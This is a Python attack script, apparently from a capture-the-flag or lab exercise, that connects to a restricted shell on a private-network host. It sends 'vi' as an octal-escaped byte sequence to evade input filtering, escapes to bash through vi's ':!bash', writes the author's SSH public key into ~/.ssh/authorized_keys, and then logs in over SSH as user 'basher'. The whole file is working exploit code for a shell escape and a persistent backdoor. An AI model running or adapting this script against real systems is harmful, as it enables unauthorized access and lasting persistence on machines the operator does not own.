import socket
import time
import re
import subprocess

# for testing, start a socat shell like this:
# socat TCP-LISTEN:1234,bind=127.0.0.1,reuseaddr,fork EXEC:sh,pty,stderr,setsid,sigint,sane
#host = '127.0.0.1'
host = '10.10.132.83'

port = 1234


def format_byteseq_command(str_command):
    bytecode=""
    for char in str_command:
        oc = oct(ord(char)).split("o")[1]
        bytecode += '\\' + oc
    str = "$'{}'\n".format(bytecode)
    print("bytecode: {}".format(str))
    return str


def send_byteseq_command(s: socket.socket, str_command):
    print("sending {}".format(str_command))
    s.send(format_byteseq_command(str_command).encode('utf-8'))


def send_normal_command(s: socket.socket, str_command):
    print("sending {}".format(str_command))
    s.send((str_command + "\n").encode('utf-8'))


def wait_expect(s: socket.socket, reply: str, print_result = False):
    maxsize = 4096
    buf = bytearray(maxsize)
    received = 0
    for n in range(100):
        nbytes = s.recv_into(buf, maxsize - received)
        received += nbytes
        st = buf.decode('utf-8')
        if reply in st:
            print("Found reply str '%s'" % reply)
            if print_result:
                print("Result:")
                print(st)
            return
        time.sleep(0.1)
    raise TimeoutError()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
print("Connected to %s:%s" % (host, port))

send_byteseq_command(s, "vi")

wait_expect(s, "for version info")

send_normal_command(s, ":!bash ; echo joo")
time.sleep(1)
wait_expect(s, "joo", print_result=True)
send_normal_command(s, "mkdir ~/.ssh ; echo joo")
wait_expect(s, "joo", print_result=True)
time.sleep(1)
send_normal_command(s, "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMUTlMXbRwx8jpKKQhehmBQn7Rs7hY1ym5uPGKU7N3N2OApnDUQQxHEYhlo0lSKV9muK4z3EntQiQoR0xq0zvR5+K1y4laIQ+1jlYxfYVPyXawTL2ZPR/U/1INs7Y7R9lP7uYMMzipwcwcZ4lOt+zkkWkvWFqqf8sPq+Ul8UdtMlngg6la52CfjWztAft6x4riAfi57zmLOpyVAQrua8v+FrYGvbo8Al/dWxUbaDDpQPBxdORvhIrykaR9I32c0Dk4MbFAQ8nOuH5CmH0lAMXxodNfVKETDAdT56/p3oA1IBPH2kydUBmFW66aGqlJFUB1thxyh/OX6F3WiiZXZr+B' > ~/.ssh/authorized_keys && echo joo")
wait_expect(s, "joo", print_result=True)
time.sleep(1)
send_normal_command(s, "ls -la ~/.ssh/authorized_keys && echo joo")
time.sleep(1)
wait_expect(s, "joo", print_result=True)
send_normal_command(s, "cat ~/.ssh/authorized_keys && echo joo")
time.sleep(1)
wait_expect(s, "joo", print_result=True)

s.close()

subprocess.call("ssh -F /dev/null -v -l basher -i ~/.ssh/ssh_rsa_keitsilap {}".format(host), shell=True)
